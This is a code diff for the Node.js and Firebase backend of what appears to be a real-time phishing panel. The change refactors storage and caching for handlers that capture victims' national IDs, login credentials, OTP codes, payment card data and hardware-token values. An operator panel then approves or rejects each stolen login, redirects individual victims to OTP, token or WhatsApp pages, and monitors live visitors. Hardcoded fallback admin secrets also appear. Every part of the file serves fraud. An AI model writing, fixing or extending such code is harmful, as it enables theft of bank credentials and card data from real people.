@@ -1,6 +1,6 @@
 const crypto = require('crypto');
 const { initializeApp, getApps, cert } = require('firebase-admin/app');
-const { getFirestore } = require('firebase-admin/firestore');
+const { getFirestore, FieldValue } = require('firebase-admin/firestore');
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
 const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
@@ -16,9 +16,12 @@ if (!getApps().length) {
   initializeApp({ credential: cert(sa) });
 }
 const db = getFirestore();
-const appsCol = db.collection('halyg_apps');
+
+const appsDoc = db.doc('halyg_store/apps');
+const visitorsDoc = db.doc('halyg_store/visitors');
 const settingsRef = db.doc('halyg_config/settings');
 
+const CACHE_TTL = 60000;
 const _cache = {};
 function cached(key, ttlMs, fn) {
   const entry = _cache[key];
@@ -26,7 +29,39 @@ function cached(key, ttlMs, fn) {
   return fn().then(data => { _cache[key] = { data, ts: Date.now() }; return data; });
 }
 function clearCache(prefix) {
-  for (const k of Object.keys(_cache)) if (k.startsWith(prefix)) delete _cache[k];
+  for (const k of Object.keys(_cache)) if (!prefix || k.startsWith(prefix)) delete _cache[k];
+}
+
+async function loadApps() {
+  return cached('store.apps', CACHE_TTL, async () => {
+    const doc = await appsDoc.get();
+    return doc.exists ? doc.data() : {};
+  });
+}
+
+async function loadVisitors() {
+  return cached('store.visitors', CACHE_TTL, async () => {
+    const doc = await visitorsDoc.get();
+    return doc.exists ? doc.data() : {};
+  });
+}
+
+async function saveApp(nationalId, data) {
+  await appsDoc.set({ [nationalId]: data }, { merge: true });
+  clearCache('store.apps');
+  clearCache('admin.');
+}
+
+async function deleteAppEntry(nationalId) {
+  await appsDoc.update({ [nationalId]: FieldValue.delete() });
+  clearCache('store.apps');
+  clearCache('admin.');
+}
+
+async function saveVisitor(sessionId, data) {
+  await visitorsDoc.set({ [sessionId]: data }, { merge: true });
+  clearCache('store.visitors');
+  clearCache('admin.');
 }
 
 function makeToken() {
@@ -41,22 +76,22 @@ function isAdminReq(req) {
   return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
 }
 
-const visitorsCol = db.collection('halyg_visitors');
-
 async function getSettings() {
-  const doc = await settingsRef.get();
-  const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
-  return doc.exists ? { ...defaults, ...doc.data() } : { ...defaults };
+  return cached('store.settings', CACHE_TTL, async () => {
+    const doc = await settingsRef.get();
+    const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
+    return doc.exists ? { ...defaults, ...doc.data() } : { ...defaults };
+  });
 }
 
 async function getOrCreateApp(nationalId) {
-  const ref = appsCol.doc(nationalId);
-  const doc = await ref.get();
-  if (doc.exists) return doc.data();
+  const allApps = await loadApps();
+  if (allApps[nationalId]) return { ...allApps[nationalId] };
 
   const settings = await getSettings();
   const newId = (settings.appIdCounter || 10000) + 1;
   await settingsRef.set({ appIdCounter: newId }, { merge: true });
+  clearCache('store.settings');
 
   const app = {
     id: newId, nationalId,
@@ -74,17 +109,16 @@ async function getOrCreateApp(nationalId) {
     createdAt: new Date().toISOString(),
     updatedAt: new Date().toISOString(),
   };
-  await ref.set(app);
+  await saveApp(nationalId, app);
   return app;
 }
 
 async function getOrCreateVisitor(sessionId) {
-  const ref = visitorsCol.doc(sessionId);
-  const doc = await ref.get();
-  if (doc.exists) return doc.data();
+  const allVisitors = await loadVisitors();
+  if (allVisitors[sessionId]) return { ...allVisitors[sessionId] };
 
-  const { FieldValue } = require('firebase-admin/firestore');
   await settingsRef.set({ totalVisitors: FieldValue.increment(1) }, { merge: true });
+  clearCache('store.settings');
 
   const visitor = {
     id: Date.now(), sessionId,
@@ -92,8 +126,15 @@ async function getOrCreateVisitor(sessionId) {
     lastActiveAt: new Date().toISOString(),
     createdAt: new Date().toISOString(),
   };
-  await ref.set(visitor);
+  await saveVisitor(sessionId, visitor);
   return visitor;
+}
+
+function findAppByField(allApps, field, value) {
+  for (const [nid, app] of Object.entries(allApps)) {
+    if (app[field] === value) return { nid, app };
+  }
+  return null;
 }
 
 async function executeProcedure(name, input, isAdmin) {
@@ -102,66 +143,74 @@ async function executeProcedure(name, input, isAdmin) {
       const { sessionId, page, currentPage } = input;
       if (sessionId) {
         const v = await getOrCreateVisitor(sessionId);
-        const updates = { lastActiveAt: new Date().toISOString() };
-        if (currentPage || page) updates.currentPage = currentPage || page;
-        await visitorsCol.doc(sessionId).update(updates);
+        v.lastActiveAt = new Date().toISOString();
+        if (currentPage || page) v.currentPage = currentPage || page;
+        await saveVisitor(sessionId, v);
       }
       return { success: true };
     }
     case 'admin.getVisitorRedirect': {
       const { sessionId } = input;
       if (!sessionId) return { redirectTo: null };
-      const doc = await visitorsCol.doc(sessionId).get();
-      const v = doc.exists ? doc.data() : null;
+      const allVisitors = await loadVisitors();
+      const v = allVisitors[sessionId];
       return { redirectTo: v ? (v.redirectTo || null) : null };
     }
     case 'admin.clearVisitorRedirect': {
       const { sessionId } = input;
       if (sessionId) {
-        const ref = visitorsCol.doc(sessionId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ redirectTo: null, lastActiveAt: new Date().toISOString() });
+        const allVisitors = await loadVisitors();
+        if (allVisitors[sessionId]) {
+          const v = { ...allVisitors[sessionId], redirectTo: null, lastActiveAt: new Date().toISOString() };
+          await saveVisitor(sessionId, v);
+        }
       }
       return { success: true };
     }
     case 'applications.getRedirectStatus': {
       const { nationalId } = input;
       if (!nationalId) return { redirectTo: null, redirectError: null };
-      const doc = await appsCol.doc(nationalId).get();
-      const app = doc.exists ? doc.data() : null;
+      const allApps = await loadApps();
+      const app = allApps[nationalId];
       return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
     }
     case 'applications.clearRedirectByUser': {
       const { nationalId } = input;
       if (nationalId) {
-        const ref = appsCol.doc(nationalId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() });
+        const allApps = await loadApps();
+        if (allApps[nationalId]) {
+          const app = { ...allApps[nationalId], redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() };
+          await saveApp(nationalId, app);
+        }
       }
       return { success: true };
     }
     case 'applications.getCustomMessage': {
       const { nationalId } = input;
       if (!nationalId) return { message: null };
-      const doc = await appsCol.doc(nationalId).get();
-      const app = doc.exists ? doc.data() : null;
+      const allApps = await loadApps();
+      const app = allApps[nationalId];
       return { message: app ? (app.customMessage || null) : null };
     }
     case 'applications.clearCustomMessage': {
       const { nationalId } = input;
       if (nationalId) {
-        const ref = appsCol.doc(nationalId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ customMessage: null });
+        const allApps = await loadApps();
+        if (allApps[nationalId]) {
+          const app = { ...allApps[nationalId], customMessage: null };
+          await saveApp(nationalId, app);
+        }
       }
       return { success: true };
     }
     case 'applications.updatePage': {
       const { nationalId, page } = input;
       if (nationalId) {
-        const ref = appsCol.doc(nationalId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ currentPage: page || doc.data().currentPage, updatedAt: new Date().toISOString() });
+        const allApps = await loadApps();
+        if (allApps[nationalId]) {
+          const app = { ...allApps[nationalId], currentPage: page || allApps[nationalId].currentPage, updatedAt: new Date().toISOString() };
+          await saveApp(nationalId, app);
+        }
       }
       return { success: true };
     }
@@ -177,7 +226,7 @@ async function executeProcedure(name, input, isAdmin) {
       if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
       app.currentPage = 'personal';
       app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'applications.saveLoginData': {
@@ -190,7 +239,7 @@ async function executeProcedure(name, input, isAdmin) {
       app.currentPage = 'waiting-login';
       app.redirectTo = null; app.redirectError = null;
       app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'applications.saveOtpData': {
@@ -202,7 +251,7 @@ async function executeProcedure(name, input, isAdmin) {
       app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'applications.saveCardData': {
@@ -218,7 +267,7 @@ async function executeProcedure(name, input, isAdmin) {
       app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'applications.saveHardToken': {
@@ -230,7 +279,7 @@ async function executeProcedure(name, input, isAdmin) {
       app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'applications.saveWatchLink': {
@@ -242,7 +291,7 @@ async function executeProcedure(name, input, isAdmin) {
       app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_watchlink'; app.updatedAt = new Date().toISOString();
-      await appsCol.doc(nationalId).set(app);
+      await saveApp(nationalId, app);
       return { success: true };
     }
     case 'admin.login': {
@@ -258,35 +307,33 @@ async function executeProcedure(name, input, isAdmin) {
     }
     case 'admin.getApplications': {
       if (!isAdmin) throw new Error('unauthorized');
-      return cached('admin.getApps', 5000, async () => {
-        const snap = await appsCol.get();
-        const apps = [];
-        snap.forEach(d => apps.push(d.data()));
+      return cached('admin.getApps', CACHE_TTL, async () => {
+        const allApps = await loadApps();
+        const apps = Object.values(allApps);
         const cutoff = Date.now() - 60000;
         const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
+        const allVisitors = await loadVisitors();
         const visitorCutoff = new Date(Date.now() - 120000).toISOString();
-        const liveSnap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
+        const liveVisitorCount = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff).length;
         const settings = await getSettings();
-        return { apps, activeIds, liveVisitorCount: liveSnap.size, totalVisitors: settings.totalVisitors };
+        return { apps, activeIds, liveVisitorCount, totalVisitors: settings.totalVisitors };
       });
     }
     case 'admin.getLiveVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      return cached('admin.liveVisitors', 5000, async () => {
+      return cached('admin.liveVisitors', CACHE_TTL, async () => {
+        const allVisitors = await loadVisitors();
         const visitorCutoff = new Date(Date.now() - 120000).toISOString();
-        const snap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
-        const visitors = [];
-        snap.forEach(d => visitors.push(d.data()));
+        const visitors = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff);
         return { visitors };
       });
     }
     case 'admin.getAllVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      return cached('admin.allVisitors', 8000, async () => {
+      return cached('admin.allVisitors', CACHE_TTL, async () => {
         const settings = await getSettings();
-        const snap = await visitorsCol.orderBy('lastActiveAt', 'desc').limit(200).get();
-        const visitors = [];
-        snap.forEach(d => visitors.push(d.data()));
+        const allVisitors = await loadVisitors();
+        const visitors = Object.values(allVisitors).sort((a, b) => (b.lastActiveAt || '').localeCompare(a.lastActiveAt || '')).slice(0, 200);
         return { visitors, totalCount: settings.totalVisitors };
       });
     }
@@ -297,49 +344,52 @@ async function executeProcedure(name, input, isAdmin) {
     case 'admin.updateWhatsAppLink': {
       if (!isAdmin) throw new Error('unauthorized');
       await settingsRef.set({ whatsappLink: input.link || '' }, { merge: true });
+      clearCache('store.settings');
       return { success: true };
     }
     case 'admin.setCustomMessage': {
       if (!isAdmin) throw new Error('unauthorized');
       const { nationalId, message } = input;
       if (nationalId) {
-        const ref = appsCol.doc(nationalId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ customMessage: message || null, updatedAt: new Date().toISOString() });
+        const allApps = await loadApps();
+        if (allApps[nationalId]) {
+          const app = { ...allApps[nationalId], customMessage: message || null, updatedAt: new Date().toISOString() };
+          await saveApp(nationalId, app);
+        }
       }
       return { success: true };
     }
     case 'admin.approveLogin': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let ref, doc;
-      if (nationalId) {
-        ref = appsCol.doc(nationalId);
-        doc = await ref.get();
+      const allApps = await loadApps();
+      let nid = nationalId;
+      if (!nid || !allApps[nid]) {
+        if (applicationId) {
+          const found = findAppByField(allApps, 'id', applicationId);
+          if (found) nid = found.nid;
+        }
       }
-      if ((!doc || !doc.exists) && applicationId) {
-        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
-        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
-      }
-      if (doc && doc.exists) {
-        await ref.update({ loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() });
+      if (nid && allApps[nid]) {
+        const app = { ...allApps[nid], loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() };
+        await saveApp(nid, app);
       }
       return { success: true };
     }
     case 'admin.rejectLogin': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let ref, doc;
-      if (nationalId) {
-        ref = appsCol.doc(nationalId);
-        doc = await ref.get();
+      const allApps = await loadApps();
+      let nid = nationalId;
+      if (!nid || !allApps[nid]) {
+        if (applicationId) {
+          const found = findAppByField(allApps, 'id', applicationId);
+          if (found) nid = found.nid;
+        }
       }
-      if ((!doc || !doc.exists) && applicationId) {
-        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
-        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
-      }
-      if (doc && doc.exists) {
-        await ref.update({ loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() });
+      if (nid && allApps[nid]) {
+        const app = { ...allApps[nid], loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() };
+        await saveApp(nid, app);
       }
       return { success: true };
     }
@@ -347,13 +397,12 @@ async function executeProcedure(name, input, isAdmin) {
       if (!isAdmin) throw new Error('unauthorized');
       const { nationalId, redirectTo, page, redirectError, showError } = input;
       if (nationalId) {
-        const ref = appsCol.doc(nationalId);
-        const doc = await ref.get();
-        if (doc.exists) {
+        const allApps = await loadApps();
+        if (allApps[nationalId]) {
           const dest = redirectTo || page || null;
-          const updates = { redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
-          if (dest) updates.currentPage = dest;
-          await ref.update(updates);
+          const app = { ...allApps[nationalId], redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
+          if (dest) app.currentPage = dest;
+          await saveApp(nationalId, app);
         }
       }
       return { success: true };
@@ -362,39 +411,44 @@ async function executeProcedure(name, input, isAdmin) {
       if (!isAdmin) throw new Error('unauthorized');
       const { sessionId, redirectTo, page } = input;
       if (sessionId) {
-        const ref = visitorsCol.doc(sessionId);
-        const doc = await ref.get();
-        if (doc.exists) await ref.update({ redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() });
+        const allVisitors = await loadVisitors();
+        if (allVisitors[sessionId]) {
+          const v = { ...allVisitors[sessionId], redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() };
+          await saveVisitor(sessionId, v);
+        }
       }
       return { success: true };
     }
     case 'admin.redirectAllToToken': {
       if (!isAdmin) throw new Error('unauthorized');
-      const snap = await appsCol.get();
-      const batch = db.batch();
-      snap.forEach(d => {
-        const app = d.data();
+      const allApps = await loadApps();
+      const updates = {};
+      for (const [nid, app] of Object.entries(allApps)) {
         if (app.status === 'active' || (app.status && app.status.startsWith('awaiting'))) {
-          batch.update(d.ref, { redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() });
+          updates[nid] = { ...app, redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() };
         }
-      });
-      await batch.commit();
+      }
+      if (Object.keys(updates).length > 0) {
+        await appsDoc.set(updates, { merge: true });
+        clearCache('store.apps');
+        clearCache('admin.');
+      }
       return { success: true };
     }
     case 'admin.redirectWhatsApp': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let ref, doc;
-      if (nationalId) {
-        ref = appsCol.doc(nationalId);
-        doc = await ref.get();
+      const allApps = await loadApps();
+      let nid = nationalId;
+      if (!nid || !allApps[nid]) {
+        if (applicationId) {
+          const found = findAppByField(allApps, 'id', applicationId);
+          if (found) nid = found.nid;
+        }
       }
-      if ((!doc || !doc.exists) && applicationId) {
-        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
-        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
-      }
-      if (doc && doc.exists) {
-        await ref.update({ redirectTo: 'whatsapp', updatedAt: new Date().toISOString() });
+      if (nid && allApps[nid]) {
+        const app = { ...allApps[nid], redirectTo: 'whatsapp', updatedAt: new Date().toISOString() };
+        await saveApp(nid, app);
       }
       return { success: true };
     }
@@ -402,38 +456,46 @@ async function executeProcedure(name, input, isAdmin) {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
       if (nationalId) {
-        await appsCol.doc(nationalId).delete();
+        await deleteAppEntry(nationalId);
       } else if (applicationId) {
-        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
-        if (!snap.empty) await snap.docs[0].ref.delete();
+        const allApps = await loadApps();
+        const found = findAppByField(allApps, 'id', applicationId);
+        if (found) await deleteAppEntry(found.nid);
       }
-      clearCache('admin.');
       return { success: true };
     }
     case 'admin.deleteInactiveClients': {
       if (!isAdmin) throw new Error('unauthorized');
+      const allApps = await loadApps();
       const cutoff = new Date(Date.now() - 120000).toISOString();
-      const snap = await appsCol.where('updatedAt', '<', cutoff).get();
+      const updates = {};
       let deletedCount = 0;
-      const batch = db.batch();
-      snap.forEach(d => { batch.delete(d.ref); deletedCount++; });
-      if (deletedCount > 0) await batch.commit();
-      clearCache('admin.');
+      for (const [nid, app] of Object.entries(allApps)) {
+        if (app.updatedAt < cutoff) {
+          updates[nid] = FieldValue.delete();
+          deletedCount++;
+        }
+      }
+      if (deletedCount > 0) {
+        await appsDoc.update(updates);
+        clearCache('store.apps');
+        clearCache('admin.');
+      }
       return { success: true, deletedCount };
     }
     case 'admin.deleteAllClients': {
       if (!isAdmin) throw new Error('unauthorized');
-      const snap = await appsCol.get();
-      const count = snap.size;
-      const batch = db.batch();
-      snap.forEach(d => batch.delete(d.ref));
-      if (count > 0) await batch.commit();
+      const allApps = await loadApps();
+      const count = Object.keys(allApps).length;
+      await appsDoc.set({});
+      clearCache('store.apps');
       clearCache('admin.');
       return { success: true, deletedCount: count };
     }
     case 'admin.resetTotalVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
       await settingsRef.set({ totalVisitors: 0 }, { merge: true });
+      clearCache('store.settings');
       return { success: true };
     }
     default:
